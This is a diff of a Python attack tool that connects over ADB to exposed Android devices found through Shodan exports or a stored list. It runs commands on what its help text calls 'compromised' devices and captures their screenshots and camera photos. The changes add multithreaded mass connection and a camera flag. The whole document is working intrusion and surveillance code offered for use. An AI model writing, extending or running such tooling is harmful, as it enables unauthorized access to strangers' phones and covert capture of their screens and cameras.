@@ -4,6 +4,7 @@ import logging
 import os
 from pathlib import Path
 from subprocess import PIPE, Popen
+from threading import Thread
 
 logo_design_4 = '''
     .o oOOOOOOOo                                            OOOo
@@ -29,6 +30,7 @@ print(logo_design_4)
 DEFAULT_ADB_PORT = 5555
 DEFAULT_DEVICES_FILE = 'devices.txt'
 DEFAULT_SCREENSHOT_DIR = 'screenshots'
+DEFAULT_THREADS_LIMIT = 10
 Path(DEFAULT_SCREENSHOT_DIR).mkdir(exist_ok=True)
 
 
@@ -44,7 +46,8 @@ def get_arguments():
                         dest='port',
                         default=DEFAULT_ADB_PORT,
                         required=False,
-                        help='A TCP port of the remote ADB service. Default is ' + str(DEFAULT_ADB_PORT))
+                        help='A TCP port of the remote ADB service. '
+                             f'Default is {DEFAULT_ADB_PORT}')
     parser.add_argument('--shodan-file',
                         dest='shodan_file',
                         required=False,
@@ -56,20 +59,29 @@ def get_arguments():
                         required=False,
                         help='A new-line separated txt file with stored IP addresses and ports '
                              'of the android devices to connect to, '
-                             'in the following format: IP_ADDRESS:PORT.')
+                             'in the following format: IP_ADDRESS:PORT. '
+                             f'Default is {DEFAULT_DEVICES_FILE}')
     parser.add_argument('-x',
                         '--execute',
                         dest='execute',
                         required=False,
-                        help='Execute a given command on the compromised android device(s)')
+                        help='Execute the given command on the compromised android device(s)')
+
     parser.add_argument('--screenshot',
                         action='store_true',
                         required=False,
                         help='Capture a screenshot from the compromised android device(s).')
     parser.add_argument('--camera',
-                        dest='camera',
+                        action='store_true',
                         required=False,
                         help='Capture a photo from the compromised android device(s).')
+    parser.add_argument('--threads',
+                        dest='threads',
+                        type=int,
+                        default=DEFAULT_THREADS_LIMIT,
+                        required=False,
+                        help=f'Specify a number of threads to work in parallel. '
+                             f'Default is {DEFAULT_THREADS_LIMIT}')
     parser.add_argument('-l',
                         '--logging',
                         dest='logging',
@@ -150,7 +162,7 @@ class AndroidDevice:
                        stderr=PIPE) as process:
                 process.communicate()
             screenshot_local_file_name = Path(
-                        DEFAULT_SCREENSHOT_DIR) / f'{self.ip_address}.png'
+                DEFAULT_SCREENSHOT_DIR) / f'{self.ip_address}.png'
             with Popen(['adb', '-s', f'{self.ip_address}:{self.port}', 'pull',
                         screenshot_remote_file_name,
                         screenshot_local_file_name],
@@ -195,6 +207,7 @@ logging.basicConfig(format='[%(asctime)s %(levelname)s]: %(message)s',
                     level=options.logging)
 
 connected_devices_file_name = options.devices_file
+threads_limit = options.threads
 android_devices = []
 if options.ip:
     android_devices = [AndroidDevice(ip_address=options.ip,
@@ -206,13 +219,29 @@ elif options.shodan_file:
     with open(file_name, 'r') as f:
         try:
             lines = f.readlines()
+
+            connection_threads = []
+            parsed_devices = []
             for i, line in enumerate(lines):
+                while len(connection_threads) >= threads_limit:
+                    for thread in connection_threads.copy():
+                        if not thread.is_alive():
+                            connection_threads.remove(thread)
+
                 dump = json.loads(line)
                 device = AndroidDevice(ip_address=dump['ip_str'],
-                                                     port=dump['port'],
-                                                     devices_file=connected_devices_file_name)
+                                       port=dump['port'],
+                                       devices_file=connected_devices_file_name)
+                parsed_devices.append(device)
+
                 logging.info('Connecting to %s:%s [%s/%s]', device.ip_address, device.port, i, len(lines))
-                device.connect()
+                connection_thread = Thread(target=device.connect, args=())
+                connection_threads.append(connection_thread)
+                connection_thread.start()
+
+            while any(thread.is_alive() for thread in connection_threads):
+                pass
+            for device in parsed_devices:
                 if device.is_connected:
                     android_devices.append(device)
         except Exception as e:
@@ -221,14 +250,29 @@ elif os.path.exists(connected_devices_file_name):
     logging.info('Connecting android devices from the stored %s file', connected_devices_file_name)
     with open(connected_devices_file_name, 'r') as f:
         lines = [line.strip() for line in f.readlines()]
+
+        connection_threads = []
+        parsed_devices = []
         for i, line in enumerate(lines):
+            while len(connection_threads) >= threads_limit:
+                for thread in connection_threads.copy():
+                    if not thread.is_alive():
+                        connection_threads.remove(thread)
+
             ip_address = line.split(':')[0]
             port = line.split(':')[1]
             logging.info('Connecting to %s:%s [%s/%s]', ip_address, port, i, len(lines))
             device = AndroidDevice(ip_address=ip_address,
                                    port=port,
                                    devices_file=connected_devices_file_name)
-            device.connect()
+            parsed_devices.append(device)
+
+            connection_thread = Thread(target=device.connect, args=())
+            connection_threads.append(connection_thread)
+            connection_thread.start()
+        while any(thread.is_alive() for thread in connection_threads):
+            pass
+        for device in parsed_devices:
             if device.is_connected:
                 android_devices.append(device)
 
@@ -251,11 +295,11 @@ if android_devices:
                 device.execute(command)
         if options.screenshot:
             for i, device in enumerate(connected_android_devices):
-                logging.info('Capturing a screenshot on %s:%s [%s/%s]', device.ip_address, device.port, i,
+                logging.info('Capturing a screenshot from %s:%s [%s/%s]', device.ip_address, device.port, i,
                              len(connected_android_devices))
                 device.get_screenshot()
         if options.camera:
             for i, device in enumerate(connected_android_devices):
-                logging.info('Capturing a photo on %s:%s [%s/%s]', device.ip_address, device.port, i,
+                logging.info('Capturing a photo from %s:%s [%s/%s]', device.ip_address, device.port, i,
                              len(connected_android_devices))
                 device.get_photo()
